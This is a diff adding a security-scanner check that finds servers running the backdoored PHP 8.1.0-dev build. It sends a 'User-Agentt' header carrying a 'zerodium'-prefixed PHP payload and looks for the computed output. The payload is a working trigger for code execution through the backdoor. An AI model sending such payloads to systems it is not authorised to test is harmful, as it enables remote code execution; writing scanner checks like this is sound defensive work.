@@ -1,0 +1,24 @@
+metadata:
+    language: v2-beta
+    name: "PHP 8.1.0-dev Backdoor - Code Injection"
+    description: "Detect servers running PHP 8.1.0-dev, which was released with a backdoor allowing Code Injection"
+    author: "r3nt0n"
+    tags: "active", "php", "code injection", "backdoor"
+
+define:
+    payload = "zerodiumvar_dump(1337*1337)"
+
+given host then
+    send request:
+        appending headers:
+            "User-Agentt": `{payload};`
+
+    if "int(1787569)" in {latest.response} then
+            report issue:
+                severity: high
+                confidence: firm
+                detail: `Code injection via backdoor introduced in PHP 8.1.0-dev:
+
+- https://news-web.php.net/php.internals/113838
+- https://flast101.github.io/php-8.1.0-dev-backdoor-rce/`
+    end if
